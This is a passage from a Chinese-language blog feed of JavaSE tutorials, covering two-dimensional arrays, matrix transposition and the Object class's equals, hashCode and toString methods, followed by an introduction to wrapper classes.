class="hljs-number">0</span>;place &lt; arr.length - <span class="hljs-number">1</span>;place++)&#123;<br>            <span class="hljs-keyword">if</span> (num &lt; arr[place])&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<span class="hljs-comment">//位置找到之后，退出循环，用place记录位置</span><br><br>        <span class="hljs-comment">//将place位置之后的成员整体向后移动一位</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> arr.length - <span class="hljs-number">2</span>; i &gt;= place ; i--) &#123;<br>            arr[i + <span class="hljs-number">1</span>] = arr[i];<br>        &#125;<br><br>        arr[place] = num;<span class="hljs-comment">//将要插入的值放到指定下标的位置</span><br><br>        System.out.println(<span class="hljs-string">&quot;插入后：&quot;</span> + Arrays.toString(arr));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="18050b9a"></a></p><h2 id="2-二维数组"><a href="#2-二维数组" class="headerlink" title="2 - 二维数组"></a>2 - 二维数组</h2><p><a name="182fc4d4"></a></p><h3 id="2-1-二维数组的概念"><a href="#2-1-二维数组的概念" class="headerlink" title="2.1 - 二维数组的概念"></a>2.1 - 二维数组的概念</h3><pre><code class="hljs">二维数组本质上就是由一维数组组成的数组，也就是说数组中的成员都是一个数组。</code></pre><p><a name="cb54b2ec"></a></p><h3 id="2-2-数组创建"><a href="#2-2-数组创建" class="headerlink" title="2.2 - 数组创建"></a>2.2 - 数组创建</h3><p><strong>定义方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[][] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<span class="hljs-comment">//定义了一个2行3列的二维数组</span><br>*  *  *<br>*  *  *<br></code></pre></td></tr></table></figure><p><strong>初始化方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[][] arr = &#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;&#125;;<span class="hljs-comment">//直接初始化2行3列的数组</span><br><span class="hljs-number">1</span>  <span class="hljs-number">2</span>  <span class="hljs-number">3</span><br><span class="hljs-number">4</span>  <span class="hljs-number">5</span>  <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  二维数组的创建</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[][] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<span class="hljs-comment">//定义的方式创建了一个2行3列的二维数组</span><br>        <span class="hljs-comment">//使用遍历的方式查看二维数组中的内容</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<span class="hljs-comment">//外循环控制行</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<span class="hljs-comment">//内层循环控制列</span><br>                System.out.print(arr[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//初始化方式创建二维数组</span><br>        <span class="hljs-type">int</span>[][] arr02 = &#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;&#125;;<br><br>        <span class="hljs-comment">//使用双重嵌套循环来打印数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>                System.out.print(arr02[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="b5c17dd9"></a></p><h3 id="2-3-二维数组的赋值和访问"><a href="#2-3-二维数组的赋值和访问" class="headerlink" title="2.3 - 二维数组的赋值和访问"></a>2.3 - 二维数组的赋值和访问</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  二维数组的访问与赋值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//定义的方式创建二维数组</span><br>        <span class="hljs-type">int</span>[][] arr01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>][<span class="hljs-number">5</span>];<br><br>        <span class="hljs-comment">//循环赋值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++) &#123;<br>                arr01[i][j] = j + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//循环遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++) &#123;<br>                System.out.print(arr01[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br><br>        <span class="hljs-comment">//赋单个的值</span><br>        arr01[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>        arr01[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;---------------------------&quot;</span>);<br><br>        <span class="hljs-comment">//循环遍历</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++) &#123;<br>                System.out.print(arr01[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br><br>        <span class="hljs-comment">//取值</span><br>        System.out.println(arr01[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]);<br><br>        <span class="hljs-comment">//无论是数组还是字符串，下标或者位置的起始点都是0.</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="4f9fb84e"></a></p><h3 id="2-4-二维数组-矩阵转置"><a href="#2-4-二维数组-矩阵转置" class="headerlink" title="2.4 - 二维数组 - 矩阵转置"></a>2.4 - 二维数组 - 矩阵转置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  二维数组 - 矩阵转置</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//初始化方式创建数组</span><br>        <span class="hljs-type">int</span>[][] arr = &#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;,&#123;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;&#125;;<br><br>        <span class="hljs-comment">//转置前的效果，遍历数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<span class="hljs-comment">//外循环控制行数</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<span class="hljs-comment">//内存换控制列数</span><br>                System.out.print(arr[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br><br>        <span class="hljs-comment">//转置效果</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>                <span class="hljs-keyword">if</span>(j &gt; i)&#123;<span class="hljs-comment">//转置的条件</span><br>                    <span class="hljs-comment">/*int t = arr[i][j];</span><br><span class="hljs-comment">                    arr[i][j] = arr[j][i];</span><br><span class="hljs-comment">                    arr[j][i] = t;*/</span><br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                    位运算当中的方式，可以实现两个值的对调</span><br><span class="hljs-comment">                        a ^= b;</span><br><span class="hljs-comment">                        b ^= a;</span><br><span class="hljs-comment">                        a ^= b;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                    * */</span><br>                    arr[i][j] ^= arr[j][i];<br>                    arr[j][i] ^= arr[i][j];<br>                    arr[i][j] ^= arr[j][i];<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);<br><br>        <span class="hljs-comment">//转置后的效果，遍历数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<span class="hljs-comment">//外循环控制行数</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<span class="hljs-comment">//内存换控制列数</span><br>                System.out.print(arr[i][j] + <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---类库</title>
    <link href="/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E7%B1%BB%E5%BA%93/"/>
    <url>/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E7%B1%BB%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="1、类库介绍"><a href="#1、类库介绍" class="headerlink" title="1、类库介绍"></a>1、类库介绍</h2><h3 id="1-1-常用包"><a href="#1-1-常用包" class="headerlink" title="1.1 - 常用包"></a>1.1 - 常用包</h3><p>java.lang包 -  该包是java中的核心包，该包中的所有类由java虚拟机自动导入</p><pre><code class="hljs">如：String类、System类、Thread类等</code></pre><p>java.util包 - 该包是java中的工具包，该包中提供了大量的工具类和集合类等</p><pre><code class="hljs">如：Scanner类、Random类、Collections类等</code></pre><p>java.io包 - 该包是java中的IO包，该包提供了有关输入输出的类信息等</p><pre><code class="hljs">如：FileInputStream类、FileOutputStream类等</code></pre><p>java.net包 - 该包是java中的网络包，该包中提供了有关网络编程类信息</p><pre><code class="hljs">如：ServerSocket类、Socket类、DatagramSocket类</code></pre><h3 id="1-2-Object类"><a href="#1-2-Object类" class="headerlink" title="1.2 - Object类"></a>1.2 - Object类</h3><p><strong>基本概念</strong></p><blockquote><p>java.lang.Object类是所有类层次结构中的根类</p></blockquote><p><strong>常用方法</strong></p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>boolean equals(Object obj)</code></td><td>用于判断调用对象和参数对象是否相等</td></tr><tr><td><code>int hashCode()</code></td><td>用于返回调用对象的哈希码值（内存地址编号）</td></tr><tr><td><code>String toString()</code></td><td>用于返回调用对象的字符串表示形式</td></tr></tbody></table><ul><li>equals</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//如果创建的类没有继承于任何类的情况下，会默认继承于Object类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br><span class="hljs-comment">//重写目的是为了比较对象的内容是否相等</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> (Student) o;<br>        <span class="hljs-keyword">return</span> age == student.age &amp;&amp;<br>                Objects.equals(name, student.name);<br>    &#125;<br>&#125;<br>------------------------------------------------<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Object类中的equals方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建学生对象</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>, <span class="hljs-number">18</span>);<br><br>        <span class="hljs-comment">//当Student类中没有重写equals方法时，默认使用父类Object类中的equals方法，比较两个学生对象的地址</span><br><span class="hljs-comment">//        System.out.println(stu01.equals(stu02));  //   false</span><br><br>        <span class="hljs-comment">//因为我们在学生实体类中重写了equals方法，重写的equals方法作用是用来比较两个对象的内容是否相等</span><br>        System.out.println(stu01.equals(stu02));  <span class="hljs-comment">//  true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>hashCode</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Object类中的hashCode方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//当前两个字符串对象地址不同</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;张三&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str02</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;李四&quot;</span>);<br><br>        <span class="hljs-comment">//获取两个对象的哈希码值，哈希值是整数类型</span><br>        System.out.println(str01.hashCode());<br>        System.out.println(str02.hashCode());<br><br>        <span class="hljs-comment">//将str01引用赋值给str03，所以指向同一个地址，所以哈希值相同</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str03</span> <span class="hljs-operator">=</span> str01;<br>        System.out.println(str03.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>toString</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Student类中重写<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>------------------------------------------------<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Object类中的toString方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建学生对象</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>, <span class="hljs-number">18</span>);<br><br>        <span class="hljs-comment">//调用Student类中的toString方法，因为Student类中没有toString方法，所以调用Object类中的toString方法</span><br>        <span class="hljs-comment">//调用Object类中的toString会打印对象的（包名+类型+@+哈希码无符号十六进制数）</span><br><span class="hljs-comment">//        System.out.println(stu01.toString());</span><br><span class="hljs-comment">//        System.out.println(stu01.hashCode());//返回Student对象的哈希码值</span><br><br>        <span class="hljs-comment">//在学生类中重写toString方法，目的是为了打印对象的内容</span><br>        System.out.println(stu01.toString());<br>        System.out.println(stu01); <span class="hljs-comment">//toString方法可以自动被调用</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="c9126b0c"></a></p><h3 id="1-3-包装类"><a href="#1-3-包装类" class="headerlink" title="1.3 - 包装类"></a>1.3 - 包装类</h3><p><a name="67cba805"></a></p><h4 id="1-3-1-包装类的概念"><a href="#1-3-1-包装类的概念" class="headerlink" title="1.3.1 - 包装类的概念"></a>1.3.1 - 包装类的概念</h4><pre><code class="hljs">在某些场合（集合）中要求所有的内容必须都是对象，但是java中的8中基本数据类型定义的变量并不是对象，为了满足该场合的需求需要对变量做对象化处理，此时需要借助包装类。</code></pre><p><a name="c1fb75cf"></a></p><h4 id="1-3-2-常用包装类"><a href="#1-3-2-常用包装类" class="headerlink" title="1.3.2 - 常用包装类"></a>1.3.2 - 常用包装类</h4><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td><code>byte</code></td><td>java.lang.Byte类</td></tr><tr><td><code>short</code></td><td>java.lang.Short类</td></tr><tr><td><code>int</code></td><td>java.lang.Integer类</td></tr><tr><td><code>long</code></td><td>java.lang.Long类</td></tr><tr><td><code>float</code></td><td>java.lang.Float类</td></tr><tr><td><code>double</code></td><td>java.lang.Double类</td></tr><tr><td><code>boolean</code></td><td>java.lang.Boolean类</td></tr><tr><td><code>char</code></td><td>java.lang.Charactor类</td></tr></tbody></table><h4 id="1-3-3-Integer类"><a href="#1-3-3-Integer类" class="headerlink" title="1.3.3 - Integer类"></a>1.3.3 - Integer类</h4><p><strong>基本概念</strong></p><pre><code 